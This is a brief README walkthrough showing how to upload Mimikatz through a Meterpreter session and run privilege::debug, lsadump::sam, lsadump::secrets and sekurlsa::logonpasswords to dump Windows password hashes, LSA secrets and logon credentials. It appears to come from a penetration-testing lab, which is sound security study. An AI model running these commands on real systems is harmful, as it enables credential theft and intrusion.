# Credential-Dumping-with-Mimikatz
Credential Dumping with Mimikatz
## Introduction of Mimikatz
Mimikatz is a free and open source program for Microsoft Windows that can be used to obtain information about login credentials. It was developed by Benjamin Delpy and Mr. Slovtsov. Mimikatz can extract plain text passwords, cryptographic hash functions, PIN codes and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, create golden tickets, work on certificates or private and protected keys.

## Credential dumping with Mimikatz
### After obtained an meterpreter sessions, we have to upload in the target machine the file mimikatz.exe
 - cd C:\\
 - mkdir Temp
 - cd Temp
 - upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe <br>
<img src="upload.png" width=70% height="auto"><br><br>
### Execute mimikatz.exe
 - shell
 - .\mimikatz.exe <br>
<img src="exe.png" width=70% height="auto"><br><br>
### Check the privilage for dumping the credentials
 - privilege::debug (vedi se ho i privilegi) <br>
<img src="priv.png" width=70% height="auto"><br><br>
### Dump the database sam 
 - lsadump::sam <br>
<img src="sam.png" width=70% height="auto"><br><br>
### Dump the secrets
 - lsadump::secrets <br>
<img src="secret.png" width=70% height="auto"><br><br>
### Dump the logon password, if bad configured, we have the password in clear text.
 - sekurlsa::logonpasswords <br>
<img src="logon.png" width=70% height="auto"><br><br>


 Unfortunately, there is no logon password in clear text, because they disabled it, so it is well configured.



#Author
<b>Xiao Li Savio Feng</b>
